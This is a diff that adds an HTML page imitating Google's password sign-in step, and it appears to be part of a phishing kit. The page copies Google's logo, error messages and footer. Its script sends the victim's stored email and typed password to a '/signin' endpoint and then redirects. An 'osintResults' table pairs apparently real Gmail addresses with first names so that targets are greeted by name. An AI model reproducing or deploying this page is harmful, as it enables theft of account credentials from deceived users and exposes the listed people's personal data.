@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title id="title-name">Welcome</title>
+    <link rel="icon" href="./logo.svg" type="image/svg+xml" />
+    <link rel="stylesheet" href="styles.css" />
+    <script src="https://kit.fontawesome.com/e4c2bd1060.js" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
+</head>
+<body>
+<div class="login-wrapper">
+    <div class="page-container">
+        <div class="login-box">
+            <div id="loading-bars" class="loading-bars-container hidden">
+                <div class="loading-bar"></div>
+                <div class="loading-bar"></div>
+            </div>
+            <div id="loading-overlay" class="loading-overlay hidden"></div>
+            <div class="logo-and-title">
+                <div class="logo"><span>
+                    <!--
+                    <svg class="logo-svg" xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
+                    -->
+                    <svg class="logo-svg" width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="48" fill="none"/><path d="M24 44C29.4 44 35.5 41.5 38 38L34.5 36L31 34C29.5 35 26.67 36 24 36C18.81 36 14.41 32.49 12.85 27.77H6.15V32.97C9.43 39.51 16.18 44 24 44Z" fill="#4285F4"/><path d="M12.85 27.77C12.45 26.58 12.23 25.31 12.23 24C12.23 22.69 12.45 21.42 12.85 20.23V15.03H6.15C4.78 17.73 4 20.77 4 24C4 27.23 4.78 30.27 6.14 32.97L12.85 27.77Z" fill="#34A853"/><path d="M24 12C26.93 12 30.5 13 32 15.03L37.38 9.22C33.92 5.98 29.39 4 24 4C16.18 4 9.43 8.49 6.14 15.03L12.84 20.23C14.41 15.51 18.81 12 24 12Z" fill="#FABB05"/><path d="M35.5 24.86C35.5 27.79 33.5 32.5 30 34.5L36 40C39.5 37 43.5 30.25 43.5 24.86C43.5 17.04 40.5 11 34.5 7L30 13.5C34 16 35.5 19.67 35.5 24.86Z" fill="#E94235"/><path d="M42.725 38.8249C42.8827 38.3519 42.6682 37.8375 42.219 37.6211C40.6661 36.873 37.9304 35.5493 37.1622 34.7812C36.2359 33.8548 35.0586 33.1243 34.5 32L32.5954 28.9527C32.2784 28.4454 31.5899 28.3281 31.1227 28.7018L27.6515 31.4788C27.2742 31.7806 27.1662 32.3094 27.3973 32.7337C28.7721 35.2587 30.2203 37.7203 32.5 40C34.7264 42.2264 37.4517 42.9082 40.0493 43.7C40.5764 43.8607 41.141 43.577 41.3153 43.0541L42 41L42.725 38.8249Z" fill="#9400D3"/></svg>
+                
+                </span></div>
+                <div class="title">
+                    <div class="change-display">
+                        <h1 id="name"></h1>
+                    </div>
+                    <div class="item-border" id="restart">
+                        <p id="display-email"></p><i class="fa-solid fa-sort-down"></i>
+                    </div>
+                </div>
+            </div>
+
+            <form id="loginForm" class="login-form">
+                <div class="input-field">
+                    <div>
+                        <div class="spacer"></div>
+                        <div class="input-wrapper">
+                            <input type="password" id="password" name="password" placeholder=" " required autofocus>
+                            <label for="password">Enter your password</label>
+                        </div>
+                        <div class="input-error" aria-live="polite">
+                            <span class="error-icon">
+                                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                            </span>
+                            <p>Wrong password. Try again or click "Forgot password?" for more options.</p>
+                        </div>
+                        <div class="checkbox-password">
+                            <div>
+                                <input type="checkbox" id="show-pass" name="show-pass" class="no-padding">
+                            </div>
+                            <label for="show-pass" class="button-password no-padding">Show password</label>
+                        </div>
+                    </div>
+                    <input title="company_name" type="text" name="company_name" class="hidden"/>
+                    <div class="submit-section">
+                        <button type="button" class="signup-button no-shadow">Forgot password?</button>
+                        <button id="submitBtn" type="submit" class="next-button">Next</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <footer class="bottom-bar">
+            <span>
+                <form autocomplete="off">
+                    <select title="Language" name="Language" data-language-selector-select>
+                        <option value="af">Afrikaans</option>
+                        <option value="az">azərbaycan</option>
+                        <option value="bs">bosanski</option>
+                        <option value="ca">català</option>
+                        <option value="cs">Čeština</option>
+                        <option value="cy">Cymraeg</option>
+                        <option value="da">Dansk</option>
+                        <option value="de">Deutsch</option>
+                        <option value="et">eesti</option>
+                        <option value="en-GB">English (United Kingdom)</option>
+                        <option value="en-US" selected>English (United States)</option>
+                        <option value="es-ES">Español (España)</option>
+                        <option value="es-419">Español (Latinoamérica)</option>
+                        <option value="eu">euskara</option>
+                        <option value="fil">Filipino</option>
+                        <option value="fr-CA">Français (Canada)</option>
+                        <option value="fr-FR">Français (France)</option>
+                        <option value="ga">Gaeilge</option>
+                        <option value="gl">galego</option>
+                        <option value="hr">Hrvatski</option>
+                        <option value="id">Indonesia</option>
+                        <option value="zu">isiZulu</option>
+                        <option value="is">íslenska</option>
+                        <option value="it">Italiano</option>
+                        <option value="sw">Kiswahili</option>
+                        <option value="lv">latviešu</option>
+                        <option value="lt">lietuvių</option>
+                        <option value="hu">magyar</option>
+                        <option value="ms">Melayu</option>
+                        <option value="nl">Nederlands</option>
+                        <option value="no">norsk</option>
+                        <option value="uz">o&#8216zbek</option>
+                        <option value="pl">polski</option>
+                        <option value="pt-BR">Português (Brasil)</option>
+                        <option value="pt-PT">Português (Portugal)</option>
+                        <option value="ro">română</option>
+                        <option value="sq">shqip</option>
+                        <option value="sk">Slovenčina</option>
+                        <option value="sl">slovenščina</option>
+                        <option value="sr-Latn">srpski (latinica)</option>
+                        <option value="fi">Suomi</option>
+                        <option value="sv">Svenska</option>
+                        <option value="vi">Tiếng Việt</option>
+                        <option value="tr">Türkçe</option>
+                        <option value="el">Ελληνικά</option>
+                        <option value="be">беларуская</option>
+                        <option value="bg">български</option>
+                        <option value="ky">кыргызча</option>
+                        <option value="kk">қазақ тілі</option>
+                        <option value="mk">македонски</option>
+                        <option value="mn">монгол</option>
+                        <option value="ru">Русский</option>
+                        <option value="sr-Cyrl">српски (ћирилица)</option>
+                        <option value="uk">Українська</option>
+                        <option value="ka">ქართული</option>
+                        <option value="hy">հայերեն</option>
+                        <option value="iw">&#2035;עברית&#2036;&#8206;</option>
+                        <option value="ur">&#2035;اردو&#2036;&#8206;</option>
+                        <option value="ar">&#2035;العربية&#2036;&#8206;</option>
+                        <option value="fa">&#2035;فارسی&#2036;&#8206;</option>
+                        <option value="am">አማርኛ</option>
+                        <option value="ne">नेपाली</option>
+                        <option value="mr">मराठी</option>
+                        <option value="hi">हिन्दी</option>
+                        <option value="as">অসমীয়া</option>
+                        <option value="bn">বাংলা</option>
+                        <option value="pa">ਪੰਜਾਬੀ</option>
+                        <option value="gu">ગુજરાતી</option>
+                        <option value="or">ଓଡ଼ିଆ</option>
+                        <option value="ta">தமிழ்</option>
+                        <option value="te">తెలుగు</option>
+                        <option value="kn">ಕನ್ನಡ</option>
+                        <option value="ml">മലയാളം</option>
+                        <option value="si">සිංහල</option>
+                        <option value="th">ไทย</option>
+                        <option value="lo">ລາວ</option>
+                        <option value="my">မြန်မာ</option>
+                        <option value="km">ខ្មែរ</option>
+                        <option value="ko">한국어</option>
+                        <option value="zh-HK">中文（香港）</option>
+                        <option value="ja">日本語</option>
+                        <option value="zh-CN">简体中文</option>
+                        <option value="zh-TW">繁體中文</option>
+                    </select>
+                </form>
+            </span>
+            <ul class="links">
+                <li><a href="#">Help</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Terms</a></li>
+            </ul>
+        </footer>
+    </div>
+</div>
+
+<script>
+    const passwordInput = document.getElementById("password");
+    const showPassCheckbox = document.getElementById("show-pass");
+
+    showPassCheckbox.addEventListener("change", () => {
+        passwordInput.type = showPassCheckbox.checked ? "text" : "password";
+    });
+</script>
+<script>
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const email = sessionStorage.getItem('email');
+        const password = document.getElementById('password').value.trim();
+
+        if (!email || !password) {
+            window.location.href = '/login';
+            return;
+        }
+
+        // START loading
+        startLoading();
+
+        try {
+            const res = await fetch('/signin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, password })
+            });
+
+            const data = await res.json();
+
+            if (data.ok && data.redirectUrl) {
+                window.location.href = data.redirectUrl;
+            }
+        } catch (err) {
+            stopLoading();
+        }
+    });
+
+    function startLoading() {
+        document.getElementById('loading-overlay').classList.remove('hidden');
+        document.getElementById('loading-bars').classList.remove('hidden');
+        document.getElementById('submitBtn').disabled = true;
+    }
+
+    function stopLoading() {
+        document.getElementById('loading-overlay').classList.add('hidden');
+        document.getElementById('loading-bars').classList.add('hidden');
+        document.getElementById('submitBtn').disabled = false;
+    }
+</script>
+
+<script>
+    const disEmail = sessionStorage.getItem('email');
+
+    if (disEmail) {
+        document.getElementById("display-email").textContent = disEmail;
+    }
+</script>
+<script>
+    const osintResults = {
+        "test@example.com": { firstName: "Test" },
+        "demo@mail.com": { firstName: "Alex" },
+        "emtmabry012@gmail.com": { firstName: "Bryan" },
+        "cleffe2913@gmail.com": { firstName: "Crystal" }
+        };
+
+    function lookupEmail(email) {
+        return osintResults[email] || null;
+    }
+
+    const emailStored = sessionStorage.getItem("email");
+    const userInfo = lookupEmail(emailStored);
+
+    if (userInfo && userInfo.firstName) {
+        document.getElementById("name").textContent = `Hi ${userInfo.firstName}`;
+        document.getElementById("title-name").textContent = `Hi ${userInfo.firstName}`;
+    } else {
+        document.getElementById("name").textContent = "Welcome";
+    }
+</script>
+<script>
+    const restartButton = document.getElementById("restart");
+
+    restartButton.addEventListener("click", () => {
+        sessionStorage.removeItem("email");
+        window.location.href = "/login";
+    });
+</script>
+<script>
+    const input = document.getElementById("password");
+    const wrapper = input.closest(".input-wrapper");
+    const errorBlock = document.querySelector(".input-error");
+
+    // Fired when form is submitted with invalid input
+    input.addEventListener("invalid", (event) => {
+        event.preventDefault(); // stop browser tooltip
+        wrapper.classList.add("error");
+        errorBlock.classList.add("show");
+    });
+
+    // Fired as user types
+    input.addEventListener("input", () => {
+        if (input.validity.valid) {
+            wrapper.classList.remove("error");
+            errorBlock.classList.remove("show");
+            input.setCustomValidity(""); // reset
+        }
+    });
+</script>
+
+</body>
+</html>
